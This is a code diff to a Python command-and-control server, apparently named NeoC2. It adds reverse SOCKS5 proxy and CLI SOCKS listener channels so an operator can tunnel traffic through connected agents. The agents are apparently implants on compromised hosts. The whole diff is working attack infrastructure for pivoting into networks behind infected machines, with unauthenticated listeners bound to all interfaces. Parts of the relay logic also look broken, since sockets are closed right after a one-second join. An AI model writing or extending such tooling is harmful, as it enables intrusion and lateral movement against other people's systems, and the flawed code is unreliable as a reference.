@@ -6,6 +6,7 @@ import os
 import base64
 import re
 import logging
+import socket
 from datetime import datetime, timedelta
 from core.models import NeoC2DB
 from cryptography.fernet import Fernet
@@ -29,11 +30,32 @@ class AgentSession:
         self.tasks = []
         self.results = []
         self.lock = threading.Lock()
-        
+
         self.interactive_mode = False
         self.interactive_task = None
         self.interactive_result = None
         self.interactive_event = threading.Event()
+
+        # Reverse proxy channel support
+        self.reverse_proxy_active = False
+        self.reverse_proxy_port = 5555
+        self.reverse_proxy_socket = None
+        self.reverse_proxy_clients = []  # List of connected SOCKS clients from agents
+        self.reverse_proxy_thread = None
+        self.reverse_proxy_stop_event = threading.Event()
+
+        # Agent's reverse proxy connection (where agent connects to implement SOCKS5)
+        self.agent_reverse_proxy_connection = None  # Connection from agent implementing SOCKS5
+        self.agent_reverse_proxy_lock = threading.Lock()
+
+        # CLI SOCKS5 proxy support - separate channel for CLI to connect to agent
+        self.cli_socks_proxy_active = False
+        self.cli_socks_proxy_port = 1080  # Default CLI SOCKS port
+        self.cli_socks_proxy_socket = None
+        self.cli_socks_proxy_thread = None
+        self.cli_socks_proxy_stop_event = threading.Event()
+        self.cli_socks_proxy_clients = []  # List of CLI SOCKS connections
+        self.cli_socks_lock = threading.Lock()  # Lock for CLI SOCKS operations
     
     def to_dict(self):
         return {
@@ -1517,3 +1539,426 @@ class AgentManager:
                 self.agent_callback(agent_data)
             except Exception as e:
                 self.logger.error(f"Error in agent registration callback: {str(e)}")
+
+    # ===== REVERSE PROXY METHODS =====
+    def start_reverse_proxy(self, agent_id, port=5555):
+        """Start reverse proxy channel with an agent"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.info(f"[-] Agent {agent_id} not found")
+            return False
+
+        with agent.lock:
+            if agent.reverse_proxy_active:
+                self.logger.info(f"[+] Reverse proxy already active for agent {agent_id}")
+                return True
+
+            agent.reverse_proxy_port = port
+            agent.reverse_proxy_stop_event.clear()
+            agent.reverse_proxy_active = True
+
+            # Start the reverse proxy thread
+            agent.reverse_proxy_thread = threading.Thread(
+                target=self._reverse_proxy_worker,
+                args=(agent_id, port),
+                daemon=True
+            )
+            agent.reverse_proxy_thread.start()
+
+            self.logger.info(f"[+] Reverse proxy started for agent {agent_id} on port {port}")
+            return True
+
+    def stop_reverse_proxy(self, agent_id):
+        """Stop reverse proxy channel with an agent"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.info(f"[-] Agent {agent_id} not found")
+            return False
+
+        with agent.lock:
+            if not agent.reverse_proxy_active:
+                self.logger.info(f"[+] Reverse proxy already stopped for agent {agent_id}")
+                return True
+
+            # Stop the proxy
+            agent.reverse_proxy_stop_event.set()
+
+            # Close all client connections
+            for client in agent.reverse_proxy_clients[:]:
+                try:
+                    client.close()
+                except:
+                    pass
+
+            # Close the main socket
+            if agent.reverse_proxy_socket:
+                try:
+                    agent.reverse_proxy_socket.close()
+                except:
+                    pass
+
+            # Clear the list
+            agent.reverse_proxy_clients = []
+
+            agent.reverse_proxy_active = False
+            agent.reverse_proxy_socket = None
+            agent.reverse_proxy_thread = None
+
+            self.logger.info(f"[+] Reverse proxy stopped for agent {agent_id}")
+            return True
+
+    def _reverse_proxy_worker(self, agent_id, port):
+        """Worker thread to handle reverse proxy connections"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.error(f"[-] Agent {agent_id} not found in reverse proxy worker")
+            return
+
+        try:
+            # Create a socket to listen for SOCKS connections from the agent
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket.bind(('0.0.0.0', port))
+            server_socket.listen(5)
+
+            with agent.lock:
+                agent.reverse_proxy_socket = server_socket
+
+            self.logger.info(f"[+] Reverse proxy listening on port {port} for agent {agent_id}")
+
+            while not agent.reverse_proxy_stop_event.is_set():
+                try:
+                    # Set a short timeout to check stop event periodically
+                    server_socket.settimeout(1.0)
+                    try:
+                        client_conn, client_addr = server_socket.accept()
+                    except socket.timeout:
+                        continue  # Check stop event and continue
+
+                    if agent.reverse_proxy_stop_event.is_set():
+                        break
+
+                    # Add client to the list
+                    with agent.lock:
+                        agent.reverse_proxy_clients.append(client_conn)
+
+                    self.logger.info(f"[+] New reverse proxy client from {client_addr} for agent {agent_id}")
+
+                    # Start a thread to handle this connection
+                    client_thread = threading.Thread(
+                        target=self._handle_reverse_proxy_client,
+                        args=(agent_id, client_conn, client_addr),
+                        daemon=True
+                    )
+                    client_thread.start()
+
+                except Exception as e:
+                    if not agent.reverse_proxy_stop_event.is_set():
+                        self.logger.error(f"[-] Error in reverse proxy worker: {str(e)}")
+                    break
+
+        except Exception as e:
+            self.logger.error(f"[-] Error in reverse proxy worker for agent {agent_id}: {str(e)}")
+        finally:
+            # Cleanup
+            with agent.lock:
+                if agent.reverse_proxy_socket:
+                    try:
+                        agent.reverse_proxy_socket.close()
+                    except:
+                        pass
+                    agent.reverse_proxy_socket = None
+
+    def _handle_reverse_proxy_client(self, agent_id, client_conn, client_addr):
+        """Handle individual reverse proxy client connection from agent"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.error(f"[-] Agent {agent_id} not found in reverse proxy client handler")
+            try:
+                client_conn.close()
+            except:
+                pass
+            return
+
+        try:
+            # Store the agent's connection so CLI can connect to it later
+            with agent.agent_reverse_proxy_lock:
+                agent.agent_reverse_proxy_connection = client_conn
+                self.logger.info(f"[+] Agent {agent_id} connected to reverse proxy, connection stored")
+
+            # The agent connects to this socket and implements the SOCKS5 server protocol
+            # This is where the agent acts as a SOCKS5 server and handles SOCKS5 requests from the server
+            self._handle_socks5_connection(agent_id, client_conn)
+
+        except Exception as e:
+            self.logger.error(f"[-] Error handling reverse proxy client for agent {agent_id}: {str(e)}")
+        finally:
+            # Remove the agent connection reference when connection closes
+            with agent.agent_reverse_proxy_lock:
+                if agent.agent_reverse_proxy_connection == client_conn:
+                    agent.agent_reverse_proxy_connection = None
+            # Remove client from the list
+            with agent.lock:
+                if client_conn in agent.reverse_proxy_clients:
+                    agent.reverse_proxy_clients.remove(client_conn)
+            try:
+                client_conn.close()
+            except:
+                pass
+
+    def _handle_socks5_connection(self, agent_id, agent_socket):
+        """
+        Handle connection from agent that implements SOCKS5 server functionality.
+        The agent acts as a SOCKS5 server, so we (the server) need to act as a SOCKS5 client.
+        We send the initial greeting to the agent and then forward requests from CLI.
+        """
+        try:
+            # Act as SOCKS5 client - send the initial greeting to the agent (which is acting as server)
+            # Send version identifier and number of methods (no auth method only)
+            agent_socket.sendall(b'\x05\x01\x00')  # SOCKS5 version, 1 method, no auth
+
+            # Read the agent's response (should be version and selected method)
+            response = self._read_exact(agent_socket, 2)
+            if not response or response[0] != 0x05 or response[1] != 0x00:
+                self.logger.error(f"[-] Invalid SOCKS5 response from agent {agent_id}")
+                return
+
+            self.logger.info(f"[+] SOCKS5 handshake successful with agent {agent_id}")
+
+            # Now the connection is established and we can forward requests from CLI
+            # Keep the agent connection alive - it will handle requests forwarded from CLI
+            self.logger.info(f"[+] Agent {agent_id} SOCKS5 client-server connection established and ready")
+
+            # Just keep the connection alive - actual SOCKS5 communication happens
+            # when CLI connects to our CLI SOCKS proxy and we forward requests to the agent
+            while True:
+                time.sleep(0.1)  # Keep connection alive, check periodically
+
+        except Exception as e:
+            self.logger.error(f"[-] Error in agent SOCKS5 connection handler for agent {agent_id}: {str(e)}")
+        finally:
+            # Clean up agent connection reference
+            agent = self.get_agent(agent_id)
+            if agent:
+                with agent.agent_reverse_proxy_lock:
+                    if agent.agent_reverse_proxy_connection == agent_socket:
+                        agent.agent_reverse_proxy_connection = None
+
+    def _read_exact(self, sock, length):
+        """Read exactly 'length' bytes from socket"""
+        data = b''
+        while len(data) < length:
+            chunk = sock.recv(length - len(data))
+            if not chunk:
+                return None
+            data += chunk
+        return data
+
+    def _relay_data(self, socket1, socket2):
+        """Relay data between two sockets bidirectionally"""
+        def relay(src, dst, name1, name2):
+            try:
+                while True:
+                    data = src.recv(4096)
+                    if not data:
+                        break
+                    dst.sendall(data)
+            except Exception as e:
+                self.logger.debug(f"[-] Relay error between {name1} and {name2}: {str(e)}")
+            finally:
+                try:
+                    src.close()
+                except:
+                    pass
+                try:
+                    dst.close()
+                except:
+                    pass
+
+        # Start two threads for bidirectional relay
+        thread1 = threading.Thread(target=relay, args=(socket1, socket2, "socket1", "socket2"), daemon=True)
+        thread2 = threading.Thread(target=relay, args=(socket2, socket1, "socket2", "socket1"), daemon=True)
+
+        thread1.start()
+        thread2.start()
+
+        # Wait for both threads to complete
+        thread1.join(timeout=1)
+        thread2.join(timeout=1)
+
+    def start_cli_socks_proxy(self, agent_id, port=1080):
+        """Start a SOCKS5 proxy that forwards to the agent's reverse proxy connection"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.error(f"[-] Agent {agent_id} not found for CLI SOCKS proxy")
+            return False
+
+        with agent.lock:
+            if agent.cli_socks_proxy_active:
+                self.logger.info(f"[+] CLI SOCKS proxy already active for agent {agent_id}")
+                return True
+
+            agent.cli_socks_proxy_port = port
+            agent.cli_socks_proxy_stop_event.clear()
+            agent.cli_socks_proxy_active = True
+
+            # Start the CLI SOCKS proxy thread
+            agent.cli_socks_proxy_thread = threading.Thread(
+                target=self._cli_socks_proxy_worker,
+                args=(agent_id, port),
+                daemon=True
+            )
+            agent.cli_socks_proxy_thread.start()
+
+            self.logger.info(f"[+] CLI SOCKS proxy started for agent {agent_id} on port {port}")
+            return True
+
+    def stop_cli_socks_proxy(self, agent_id):
+        """Stop the CLI SOCKS5 proxy for an agent"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.error(f"[-] Agent {agent_id} not found for CLI SOCKS proxy stop")
+            return False
+
+        with agent.lock:
+            if not agent.cli_socks_proxy_active:
+                self.logger.info(f"[+] CLI SOCKS proxy already stopped for agent {agent_id}")
+                return True
+
+            # Stop the proxy
+            agent.cli_socks_proxy_stop_event.set()
+
+            # Close all CLI client connections
+            for client in agent.cli_socks_proxy_clients[:]:
+                try:
+                    client.close()
+                except:
+                    pass
+
+            # Close the main socket
+            if agent.cli_socks_proxy_socket:
+                try:
+                    agent.cli_socks_proxy_socket.close()
+                except:
+                    pass
+
+            # Clear the list
+            agent.cli_socks_proxy_clients = []
+
+            agent.cli_socks_proxy_active = False
+            agent.cli_socks_proxy_socket = None
+            agent.cli_socks_proxy_thread = None
+
+            self.logger.info(f"[+] CLI SOCKS proxy stopped for agent {agent_id}")
+            return True
+
+    def _cli_socks_proxy_worker(self, agent_id, port):
+        """Worker thread to handle CLI SOCKS5 proxy connections"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.error(f"[-] Agent {agent_id} not found in CLI SOCKS proxy worker")
+            return
+
+        try:
+            # Create a socket to listen for SOCKS connections from CLI
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket.bind(('0.0.0.0', port))  # Bind to all interfaces
+            server_socket.listen(5)
+
+            with agent.lock:
+                agent.cli_socks_proxy_socket = server_socket
+
+            self.logger.info(f"[+] CLI SOCKS proxy listening on port {port} for agent {agent_id}")
+
+            while not agent.cli_socks_proxy_stop_event.is_set():
+                try:
+                    # Set a short timeout to check stop event periodically
+                    server_socket.settimeout(1.0)
+                    try:
+                        client_conn, client_addr = server_socket.accept()
+                    except socket.timeout:
+                        continue  # Check stop event and continue
+
+                    if agent.cli_socks_proxy_stop_event.is_set():
+                        break
+
+                    # Add client to the list
+                    with agent.lock:
+                        agent.cli_socks_proxy_clients.append(client_conn)
+
+                    self.logger.info(f"[+] New CLI SOCKS client from {client_addr} for agent {agent_id}")
+
+                    # Start a thread to handle this connection
+                    client_thread = threading.Thread(
+                        target=self._handle_cli_socks_client,
+                        args=(agent_id, client_conn, client_addr),
+                        daemon=True
+                    )
+                    client_thread.start()
+
+                except Exception as e:
+                    if not agent.cli_socks_proxy_stop_event.is_set():
+                        self.logger.error(f"[-] Error in CLI SOCKS proxy worker: {str(e)}")
+                    break
+
+        except Exception as e:
+            self.logger.error(f"[-] Error in CLI SOCKS proxy worker for agent {agent_id}: {str(e)}")
+        finally:
+            # Cleanup
+            with agent.lock:
+                if agent.cli_socks_proxy_socket:
+                    try:
+                        agent.cli_socks_proxy_socket.close()
+                    except:
+                        pass
+                    agent.cli_socks_proxy_socket = None
+
+    def _handle_cli_socks_client(self, agent_id, client_conn, client_addr):
+        """Handle individual CLI SOCKS5 client connection and bridge to agent"""
+        agent = self.get_agent(agent_id)
+        if not agent:
+            self.logger.error(f"[-] Agent {agent_id} not found in CLI SOCKS client handler")
+            try:
+                client_conn.close()
+            except:
+                pass
+            return
+
+        try:
+            # Wait for the agent's reverse proxy connection to be available
+            agent_connection = None
+            timeout = time.time() + 30  # 30 second timeout
+            while time.time() < timeout:
+                with agent.agent_reverse_proxy_lock:
+                    if agent.agent_reverse_proxy_connection:
+                        agent_connection = agent.agent_reverse_proxy_connection
+                        break
+                time.sleep(0.1)
+
+            if not agent_connection:
+                self.logger.error(f"[-] No agent connection available for CLI SOCKS client from {client_addr}")
+                # Send proper SOCKS5 error response before closing
+                try:
+                    client_conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')  # Connection refused
+                except:
+                    pass
+                client_conn.close()
+                return
+
+            self.logger.info(f"[+] Bridging CLI SOCKS connection to agent {agent_id}")
+
+            # Now relay data between CLI client and agent connection
+            self._relay_data(client_conn, agent_connection)
+
+        except Exception as e:
+            self.logger.error(f"[-] Error handling CLI SOCKS client for agent {agent_id}: {str(e)}")
+        finally:
+            # Remove client from the list
+            with agent.lock:
+                if client_conn in agent.cli_socks_proxy_clients:
+                    agent.cli_socks_proxy_clients.remove(client_conn)
+            try:
+                client_conn.close()
+            except:
+                pass
